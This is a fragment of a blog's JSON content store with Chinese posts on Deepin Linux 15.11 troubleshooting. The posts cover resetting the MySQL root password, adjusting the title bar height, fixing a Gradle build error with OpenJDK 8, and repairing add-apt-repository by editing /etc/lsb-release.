class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\"><span class=\"comment\"># 然后我们就可以这样来打开文件了：</span></span><br><span class=\"line\">sudo gedit xxx.txt</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"关于MySQL安装后不知道密码的问题\"><a href=\"#关于MySQL安装后不知道密码的问题\" class=\"headerlink\" title=\"关于MySQL安装后不知道密码的问题\"></a>关于MySQL安装后不知道密码的问题</h3><p>在Deepin上安装东西还是很方便的，大部分软件都不需要再添加私有源了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure>\n\n<p>安装MySQL成功后会发现并没有提示设置密码，也没告诉你初始密码。这时候可以先免密登录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -uroot</span><br></pre></td></tr></table></figure>\n\n<p>进入mysql后两步操作给root用户设置密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update mysql.user <span class=\"built_in\">set</span> plugin=“mysql_native_password” <span class=\"built_in\">where</span> user=“root”;</span><br><span class=\"line\">update mysql.user <span class=\"built_in\">set</span> authentication_string=password(‘你的密码，只用改这个地方’) <span class=\"built_in\">where</span> user=<span class=\"string\">&#x27;root’and Host = ‘localhost’;</span></span><br></pre></td></tr></table></figure>\n\n<p>退出后重启一下服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service mysql restart</span><br><span class=\"line\"><span class=\"comment\"># 然后就可以正常登录了</span></span><br><span class=\"line\">mysql -uroot -p</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"搜狗输入法登录问题\"><a href=\"#搜狗输入法登录问题\" class=\"headerlink\" title=\"搜狗输入法登录问题\"></a>搜狗输入法登录问题</h3><p>如果是QQ号登录，输入账号密码登录貌似不行，用手机QQ扫码登录就可以了。</p>\n<h3 id=\"标题栏太高怎么办\"><a href=\"#标题栏太高怎么办\" class=\"headerlink\" title=\"标题栏太高怎么办\"></a>标题栏太高怎么办</h3><p><a href=\"https://blog.ysy950803.top/2019/10/10/Deepin%E6%A0%87%E9%A2%98%E6%A0%8F%E5%A4%AA%E9%AB%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AB%98%E5%BA%A6/\">Deepin标题栏太高的解决办法（自定义高度）</a></p>\n<h3 id=\"add-apt-repository失败问题\"><a href=\"#add-apt-repository失败问题\" class=\"headerlink\" title=\"add-apt-repository失败问题\"></a>add-apt-repository失败问题</h3><p><a href=\"https://blog.ysy950803.top/2019/10/28/Deepin%E7%B3%BB%E7%BB%9Fadd-apt-repository%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">Deepin系统add-apt-repository失败的问题</a></p>\n<h3 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h3><p><strong>优点</strong><br>总的说来，Deepin还是很漂亮的，而且应用商店里的东西也非常丰富，一键安装，省去不少麻烦。除了显卡驱动要自己弄，其他硬件我觉得支持得都非常好，我的破台式显示器居然可以在控制中心里调亮度，在Ubuntu上就不行。真的是一个让Linux走近千万家的系统。<br>就流畅性而言，也没有感到和Ubuntu有什么差距，只是刚换过来，有一些操作习惯可能会有些许不同，适应几天就顺手了。</p>\n<p><strong>槽点</strong><br>以目前这个版本（15.11）来说，我最大的槽点应该就是标题栏了，实在太粗了，最大化之后一个标题栏就要占两行代码的位置，而且不能自定义高度，希望后续版本有改进。<br><img src=\"https://imgconvert.csdnimg.cn/20191003135612820.png\" alt=\"在这里插入图片描述\"><br>还有deepin-wine版微信每次重新启动后不能保存上一次的自定义窗口大小，在Ubuntu上都不会这样。<br>酸酸乳PAC模式在Deepin上好像有问题，我发现先开全局模式再开PAC就能解决。</p>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><p>相比Ubuntu，Deepin还是有很多不同和亮点的，后面如果再想到什么再追加吧。</p>\n"},{"layout":"post","title":"Deepin标题栏太高的解决办法（自定义高度）","subtitle":"专治各种小毛病。","date":"2019-10-09T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\nDeepin 15.11已经发布一段时间了，前段时间折腾了一下，把我的Ubuntu换成了Deepin（有兴趣可以看看我的另一篇：[Deepin15.11初体验及问题解决](https://blog.ysy950803.top/2019/10/03/Deepin15.11%E5%88%9D%E4%BD%93%E9%AA%8C%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/)），总体感觉非常好。\n依我个人习惯，目前有两点不是很能接受：\n- 第一就是软件源貌似是debian stable的，所以很多软件版本比较老，比如git版本，远低于官方版本，这个还是有一些解决办法的，具体的我就没去折腾了，Deepin官方主要可能还是考虑兼容性和稳定性吧。\n- 第二就是UI，默认的主题其实还是很好看的，但唯一不能接受的就是标题栏太高而且还不能提供修改的方法。\n\n默认的标题栏在系统的一些界面里还是很好看很契合的，可一旦到了三方软件上，就惨不忍睹了。我量了一下足足占了40像素，又要少看两行代码了哈哈哈！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191010222803456.png)\n我更希望它只有24像素，就像这样：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191010222838137.png)\n### 解决办法\n其实不止我一个人，很多用户也在官方issue里吐槽了，所以早就有了解决办法。\n1、先创建一个目录，如果有就不用了：\n```bash\n# 如果你是用的默认的白色主题\nmkdir -p ~/.local/share/deepin/themes/deepin/light\n# 如果你用的黑色主题\nmkdir -p ~/.local/share/deepin/themes/deepin/dark\n```\n2、进入改目录后创建配置文件：\n```bash\ncd ~/.local/share/deepin/themes/deepin/dark\ndeepin-editor titlebar.ini\n```\n3、加入下面内容并保存：\n```ini\n[Active]\nheight=24\n\n[Inactive]\nheight=24\n```\n这个24是我自定义的像素，你想给多少给多少。\n最后，注销或者重启系统即可生效。\n#### 参考\n[https://github.com/linuxdeepin/developer-center/issues/1210](https://github.com/linuxdeepin/developer-center/issues/1210)\n","source":"_posts/2019-10-10-Deepin标题栏太高的解决办法（自定义高度）.md","raw":"---\nlayout:     post\ntitle:      Deepin标题栏太高的解决办法（自定义高度）\nsubtitle:   专治各种小毛病。\ndate:       2019-10-10\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Linux\n---\n\nDeepin 15.11已经发布一段时间了，前段时间折腾了一下，把我的Ubuntu换成了Deepin（有兴趣可以看看我的另一篇：[Deepin15.11初体验及问题解决](https://blog.ysy950803.top/2019/10/03/Deepin15.11%E5%88%9D%E4%BD%93%E9%AA%8C%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/)），总体感觉非常好。\n依我个人习惯，目前有两点不是很能接受：\n- 第一就是软件源貌似是debian stable的，所以很多软件版本比较老，比如git版本，远低于官方版本，这个还是有一些解决办法的，具体的我就没去折腾了，Deepin官方主要可能还是考虑兼容性和稳定性吧。\n- 第二就是UI，默认的主题其实还是很好看的，但唯一不能接受的就是标题栏太高而且还不能提供修改的方法。\n\n默认的标题栏在系统的一些界面里还是很好看很契合的，可一旦到了三方软件上，就惨不忍睹了。我量了一下足足占了40像素，又要少看两行代码了哈哈哈！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191010222803456.png)\n我更希望它只有24像素，就像这样：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191010222838137.png)\n### 解决办法\n其实不止我一个人，很多用户也在官方issue里吐槽了，所以早就有了解决办法。\n1、先创建一个目录，如果有就不用了：\n```bash\n# 如果你是用的默认的白色主题\nmkdir -p ~/.local/share/deepin/themes/deepin/light\n# 如果你用的黑色主题\nmkdir -p ~/.local/share/deepin/themes/deepin/dark\n```\n2、进入改目录后创建配置文件：\n```bash\ncd ~/.local/share/deepin/themes/deepin/dark\ndeepin-editor titlebar.ini\n```\n3、加入下面内容并保存：\n```ini\n[Active]\nheight=24\n\n[Inactive]\nheight=24\n```\n这个24是我自定义的像素，你想给多少给多少。\n最后，注销或者重启系统即可生效。\n#### 参考\n[https://github.com/linuxdeepin/developer-center/issues/1210](https://github.com/linuxdeepin/developer-center/issues/1210)\n","slug":"Deepin标题栏太高的解决办法（自定义高度）","published":1,"updated":"2024-03-25T07:31:25.856Z","comments":1,"photos":[],"link":"","_id":"cluaufh0q001gthe6au5o4rqk","content":"<p>Deepin 15.11已经发布一段时间了，前段时间折腾了一下，把我的Ubuntu换成了Deepin（有兴趣可以看看我的另一篇：<a href=\"https://blog.ysy950803.top/2019/10/03/Deepin15.11%E5%88%9D%E4%BD%93%E9%AA%8C%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/\">Deepin15.11初体验及问题解决</a>），总体感觉非常好。<br>依我个人习惯，目前有两点不是很能接受：</p>\n<ul>\n<li>第一就是软件源貌似是debian stable的，所以很多软件版本比较老，比如git版本，远低于官方版本，这个还是有一些解决办法的，具体的我就没去折腾了，Deepin官方主要可能还是考虑兼容性和稳定性吧。</li>\n<li>第二就是UI，默认的主题其实还是很好看的，但唯一不能接受的就是标题栏太高而且还不能提供修改的方法。</li>\n</ul>\n<p>默认的标题栏在系统的一些界面里还是很好看很契合的，可一旦到了三方软件上，就惨不忍睹了。我量了一下足足占了40像素，又要少看两行代码了哈哈哈！<br><img src=\"https://imgconvert.csdnimg.cn/20191010222803456.png\" alt=\"在这里插入图片描述\"><br>我更希望它只有24像素，就像这样：<br><img src=\"https://imgconvert.csdnimg.cn/20191010222838137.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>其实不止我一个人，很多用户也在官方issue里吐槽了，所以早就有了解决办法。<br>1、先创建一个目录，如果有就不用了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果你是用的默认的白色主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.local/share/deepin/themes/deepin/light</span><br><span class=\"line\"><span class=\"comment\"># 如果你用的黑色主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.local/share/deepin/themes/deepin/dark</span><br></pre></td></tr></table></figure>\n<p>2、进入改目录后创建配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.local/share/deepin/themes/deepin/dark</span><br><span class=\"line\">deepin-editor titlebar.ini</span><br></pre></td></tr></table></figure>\n<p>3、加入下面内容并保存：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Active]</span></span><br><span class=\"line\"><span class=\"attr\">height</span>=<span class=\"number\">24</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Inactive]</span></span><br><span class=\"line\"><span class=\"attr\">height</span>=<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>这个24是我自定义的像素，你想给多少给多少。<br>最后，注销或者重启系统即可生效。</p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p><a href=\"https://github.com/linuxdeepin/developer-center/issues/1210\">https://github.com/linuxdeepin/developer-center/issues/1210</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>Deepin 15.11已经发布一段时间了，前段时间折腾了一下，把我的Ubuntu换成了Deepin（有兴趣可以看看我的另一篇：<a href=\"https://blog.ysy950803.top/2019/10/03/Deepin15.11%E5%88%9D%E4%BD%93%E9%AA%8C%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/\">Deepin15.11初体验及问题解决</a>），总体感觉非常好。<br>依我个人习惯，目前有两点不是很能接受：</p>\n<ul>\n<li>第一就是软件源貌似是debian stable的，所以很多软件版本比较老，比如git版本，远低于官方版本，这个还是有一些解决办法的，具体的我就没去折腾了，Deepin官方主要可能还是考虑兼容性和稳定性吧。</li>\n<li>第二就是UI，默认的主题其实还是很好看的，但唯一不能接受的就是标题栏太高而且还不能提供修改的方法。</li>\n</ul>\n<p>默认的标题栏在系统的一些界面里还是很好看很契合的，可一旦到了三方软件上，就惨不忍睹了。我量了一下足足占了40像素，又要少看两行代码了哈哈哈！<br><img src=\"https://imgconvert.csdnimg.cn/20191010222803456.png\" alt=\"在这里插入图片描述\"><br>我更希望它只有24像素，就像这样：<br><img src=\"https://imgconvert.csdnimg.cn/20191010222838137.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>其实不止我一个人，很多用户也在官方issue里吐槽了，所以早就有了解决办法。<br>1、先创建一个目录，如果有就不用了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果你是用的默认的白色主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.local/share/deepin/themes/deepin/light</span><br><span class=\"line\"><span class=\"comment\"># 如果你用的黑色主题</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.local/share/deepin/themes/deepin/dark</span><br></pre></td></tr></table></figure>\n<p>2、进入改目录后创建配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.local/share/deepin/themes/deepin/dark</span><br><span class=\"line\">deepin-editor titlebar.ini</span><br></pre></td></tr></table></figure>\n<p>3、加入下面内容并保存：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Active]</span></span><br><span class=\"line\"><span class=\"attr\">height</span>=<span class=\"number\">24</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Inactive]</span></span><br><span class=\"line\"><span class=\"attr\">height</span>=<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>这个24是我自定义的像素，你想给多少给多少。<br>最后，注销或者重启系统即可生效。</p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p><a href=\"https://github.com/linuxdeepin/developer-center/issues/1210\">https://github.com/linuxdeepin/developer-center/issues/1210</a></p>\n"},{"layout":"post","title":"Gradle命令编译失败NoClassDefFoundError和VerifyError","subtitle":"多加思索。","date":"2019-10-11T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\n不知道大家在编译gradle项目的时候习惯直接在Android Studio这种IDE里面还是命令行操作。\n今天在Deepin系统里面用命令编译：\n\n```bash\n./gradlew assembleDebug\n```\n\n直接报错：\n\n> Exception in thread \"main\" java.lang.NoClassDefFoundError: org.gradle.wrapper.BootstrapMainStarter\n>    at java.lang.Class.initializeClass(libgcj.so.17)\n>    at org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:61)\n> Caused by: java.lang.VerifyError: verification failed at PC 96 in org.gradle.wrapper.BootstrapMainStarter:start(([Ljava.lang.String;Ljava.io.File;)V): incompatible type on stack\n>    at java.lang.Class.initializeClass(libgcj.so.17)\n>    ...1 more\n\n然后用Studio的Build Apk功能又没问题。顿时感觉奇怪。\n去谷歌了一下这个错误，没找到什么实用的信息。\n\n### 解决\n\n冷静分析 -> 稍加思索 -> $^&*#@，想到了最开始安装Deepin的时候查到 **java -version** 还是 **1.5** ，以我多年的踩雷经验，应该是Java版本太旧导致的。\n\n顺手一个openjdk8给安排上：\n\n```bash\nsudo apt-get install openjdk-8-jdk\n```\n\n安装完成，解决了。再次使用gradle命令就不会出错了。\n","source":"_posts/2019-10-12-Gradle命令编译失败NoClassDefFoundError和VerifyError.md","raw":"---\nlayout:     post\ntitle:      Gradle命令编译失败NoClassDefFoundError和VerifyError\nsubtitle:   多加思索。\ndate:       2019-10-12\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Gradle\n    - Android\n    - Java\n---\n\n### 问题\n\n不知道大家在编译gradle项目的时候习惯直接在Android Studio这种IDE里面还是命令行操作。\n今天在Deepin系统里面用命令编译：\n\n```bash\n./gradlew assembleDebug\n```\n\n直接报错：\n\n> Exception in thread \"main\" java.lang.NoClassDefFoundError: org.gradle.wrapper.BootstrapMainStarter\n>    at java.lang.Class.initializeClass(libgcj.so.17)\n>    at org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:61)\n> Caused by: java.lang.VerifyError: verification failed at PC 96 in org.gradle.wrapper.BootstrapMainStarter:start(([Ljava.lang.String;Ljava.io.File;)V): incompatible type on stack\n>    at java.lang.Class.initializeClass(libgcj.so.17)\n>    ...1 more\n\n然后用Studio的Build Apk功能又没问题。顿时感觉奇怪。\n去谷歌了一下这个错误，没找到什么实用的信息。\n\n### 解决\n\n冷静分析 -> 稍加思索 -> $^&*#@，想到了最开始安装Deepin的时候查到 **java -version** 还是 **1.5** ，以我多年的踩雷经验，应该是Java版本太旧导致的。\n\n顺手一个openjdk8给安排上：\n\n```bash\nsudo apt-get install openjdk-8-jdk\n```\n\n安装完成，解决了。再次使用gradle命令就不会出错了。\n","slug":"Gradle命令编译失败NoClassDefFoundError和VerifyError","published":1,"updated":"2024-03-25T07:31:25.857Z","comments":1,"photos":[],"link":"","_id":"cluaufh0r001ithe6fqcf5h0q","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>不知道大家在编译gradle项目的时候习惯直接在Android Studio这种IDE里面还是命令行操作。<br>今天在Deepin系统里面用命令编译：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./gradlew assembleDebug</span><br></pre></td></tr></table></figure>\n\n<p>直接报错：</p>\n<blockquote>\n<p>Exception in thread “main” java.lang.NoClassDefFoundError: org.gradle.wrapper.BootstrapMainStarter<br>   at java.lang.Class.initializeClass(libgcj.so.17)<br>   at org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:61)<br>Caused by: java.lang.VerifyError: verification failed at PC 96 in org.gradle.wrapper.BootstrapMainStarter:start(([Ljava.lang.String;Ljava.io.File;)V): incompatible type on stack<br>   at java.lang.Class.initializeClass(libgcj.so.17)<br>   …1 more</p>\n</blockquote>\n<p>然后用Studio的Build Apk功能又没问题。顿时感觉奇怪。<br>去谷歌了一下这个错误，没找到什么实用的信息。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>冷静分析 -&gt; 稍加思索 -&gt; $^&amp;*#@，想到了最开始安装Deepin的时候查到 <strong>java -version</strong> 还是 <strong>1.5</strong> ，以我多年的踩雷经验，应该是Java版本太旧导致的。</p>\n<p>顺手一个openjdk8给安排上：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>\n\n<p>安装完成，解决了。再次使用gradle命令就不会出错了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>不知道大家在编译gradle项目的时候习惯直接在Android Studio这种IDE里面还是命令行操作。<br>今天在Deepin系统里面用命令编译：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./gradlew assembleDebug</span><br></pre></td></tr></table></figure>\n\n<p>直接报错：</p>\n<blockquote>\n<p>Exception in thread “main” java.lang.NoClassDefFoundError: org.gradle.wrapper.BootstrapMainStarter<br>   at java.lang.Class.initializeClass(libgcj.so.17)<br>   at org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:61)<br>Caused by: java.lang.VerifyError: verification failed at PC 96 in org.gradle.wrapper.BootstrapMainStarter:start(([Ljava.lang.String;Ljava.io.File;)V): incompatible type on stack<br>   at java.lang.Class.initializeClass(libgcj.so.17)<br>   …1 more</p>\n</blockquote>\n<p>然后用Studio的Build Apk功能又没问题。顿时感觉奇怪。<br>去谷歌了一下这个错误，没找到什么实用的信息。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>冷静分析 -&gt; 稍加思索 -&gt; $^&amp;*#@，想到了最开始安装Deepin的时候查到 <strong>java -version</strong> 还是 <strong>1.5</strong> ，以我多年的踩雷经验，应该是Java版本太旧导致的。</p>\n<p>顺手一个openjdk8给安排上：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>\n\n<p>安装完成，解决了。再次使用gradle命令就不会出错了。</p>\n"},{"layout":"post","title":"Deepin系统add-apt-repository失败的问题","subtitle":"专治各种小毛病。","date":"2019-10-27T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 不只是安装software-properties-common那么简单……\n\n------\n\n#### 问题\n\n目前Deepin系统版本为15.11，貌似在15.10时切到了Debain的软件仓库，而不再是Ubuntu了，虽说比较稳定，但还不够新，比如git，版本就没有官方的新。\n于是我尝试 [git官方的办法](https://git-scm.com/download/linux)：\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\n```\n\n报错，提示未找到命令。\n\n#### 解决\n\n这个问题在网上搜搜办法，很多回答都是让安装一个包：\n\n```bash\nsudo apt-get install software-properties-common\n```\n\n是的，确实解决了 **add-apt-repository** 命令找不到的问题，但实际add仓库源时，还是会出错，你可能会看到如下内容：\n\n> Traceback (most recent call last):\n>   File \"/usr/bin/add-apt-repository\", line 95, in <module>\n>     sp = SoftwareProperties(options=options)\n>   File \"/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py\", line 109, in __init__\n>     self.reload_sourceslist()\n>   File \"/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py\", line 599, in reload_sourceslist\n>     self.distro.get_sources(self.sourceslist)    \n>   File \"/usr/lib/python3/dist-packages/aptsources/distro.py\", line 93, in get_sources\n>     (self.id, self.codename))\n> aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Deepin/stable\n\n很尴尬啊兄弟！看这个报错就大概明白，还是因为Deepin/stable不适用这种三方ppa导致的。\n\n我可不想就此放弃，经过一番仔细搜寻，找到一个[大佬的解决办法](https://bbs.deepin.org/forum.php?mod=viewthread&tid=177967)：\n\n1. 编辑lsb-release文件：\n\n   ```bash\n   sudo deepin-editor /etc/lsb-release\n   ```\n\n2. 把已有内容的每行头加#注释掉，添加Ubuntu相关的内容：\n\n   ```bash\n   # DISTRIB_ID=Deepin\n   # DISTRIB_RELEASE=\"15.11\"\n   # DISTRIB_DESCRIPTION=\"Deepin 15.11 \"\n   # DISTRIB_CODENAME=stable\n   \n   DISTRIB_ID=Ubuntu\n   DISTRIB_RELEASE=16.04\n   DISTRIB_DESCRIPTION=\"Ubuntu 16.04.6 LTS\"\n   DISTRIB_CODENAME=trusty\n   ```\n\n3. 此时再试试 **sudo add-apt-repository ppa:git-core/ppa** 看看，却报了另一个错：\n\n   > The most current stable version of Git for Ubuntu.\n   >\n   > For release candidates, go to https://launchpad.net/~git-core/+archive/candidate .\n   > More info: https://launchpad.net/~git-core/+archive/ubuntu/ppa\n   > Press [ENTER] to continue or ctrl-c to cancel adding it\n   >\n   > gpg: keybox '/tmp/tmprpx7ycut/pubring.gpg' created\n   > gpg: failed to start the dirmngr '/usr/bin/dirmngr': 没有那个文件或目录\n   > gpg: connecting dirmngr at '/tmp/tmprpx7ycut/S.dirmngr' failed: 没有那个文件或目录\n   > gpg: keyserver receive failed: No dirmngr\n\n4. 不要慌，他说没有dirmngr，我们就安一个：\n\n   ```bash\n   sudo apt-get install dirmngr\n   ```\n\n最后再add仓库ppa就不会报错了。\n搞定之后，就能顺利安装最新的git：\n\n```bash\nsudo apt-get update\nsudo apt-get install git\n```\n","source":"_posts/2019-10-28-Deepin系统add-apt-repository失败的问题.md","raw":"---\nlayout:     post\ntitle:      Deepin系统add-apt-repository失败的问题\nsubtitle:   专治各种小毛病。\ndate:       2019-10-28\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Linux\n---\n\n> 不只是安装software-properties-common那么简单……\n\n------\n\n#### 问题\n\n目前Deepin系统版本为15.11，貌似在15.10时切到了Debain的软件仓库，而不再是Ubuntu了，虽说比较稳定，但还不够新，比如git，版本就没有官方的新。\n于是我尝试 [git官方的办法](https://git-scm.com/download/linux)：\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\n```\n\n报错，提示未找到命令。\n\n#### 解决\n\n这个问题在网上搜搜办法，很多回答都是让安装一个包：\n\n```bash\nsudo apt-get install software-properties-common\n```\n\n是的，确实解决了 **add-apt-repository** 命令找不到的问题，但实际add仓库源时，还是会出错，你可能会看到如下内容：\n\n> Traceback (most recent call last):\n>   File \"/usr/bin/add-apt-repository\", line 95, in <module>\n>     sp = SoftwareProperties(options=options)\n>   File \"/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py\", line 109, in __init__\n>     self.reload_sourceslist()\n>   File \"/usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py\", line 599, in reload_sourceslist\n>     self.distro.get_sources(self.sourceslist)    \n>   File \"/usr/lib/python3/dist-packages/aptsources/distro.py\", line 93, in get_sources\n>     (self.id, self.codename))\n> aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Deepin/stable\n\n很尴尬啊兄弟！看这个报错就大概明白，还是因为Deepin/stable不适用这种三方ppa导致的。\n\n我可不想就此放弃，经过一番仔细搜寻，找到一个[大佬的解决办法](https://bbs.deepin.org/forum.php?mod=viewthread&tid=177967)：\n\n1. 编辑lsb-release文件：\n\n   ```bash\n   sudo deepin-editor /etc/lsb-release\n   ```\n\n2. 把已有内容的每行头加#注释掉，添加Ubuntu相关的内容：\n\n   ```bash\n   # DISTRIB_ID=Deepin\n   # DISTRIB_RELEASE=\"15.11\"\n   # DISTRIB_DESCRIPTION=\"Deepin 15.11 \"\n   # DISTRIB_CODENAME=stable\n   \n   DISTRIB_ID=Ubuntu\n   DISTRIB_RELEASE=16.04\n   DISTRIB_DESCRIPTION=\"Ubuntu 16.04.6 LTS\"\n   DISTRIB_CODENAME=trusty\n   ```\n\n3. 此时再试试 **sudo add-apt-repository ppa:git-core/ppa** 看看，却报了另一个错：\n\n   > The most current stable version of Git for Ubuntu.\n   >\n   > For release candidates, go to https://launchpad.net/~git-core/+archive/candidate .\n   > More info: https://launchpad.net/~git-core/+archive/ubuntu/ppa\n   > Press [ENTER] to continue or ctrl-c to cancel adding it\n   >\n   > gpg: keybox '/tmp/tmprpx7ycut/pubring.gpg' created\n   > gpg: failed to start the dirmngr '/usr/bin/dirmngr': 没有那个文件或目录\n   > gpg: connecting dirmngr at '/tmp/tmprpx7ycut/S.dirmngr' failed: 没有那个文件或目录\n   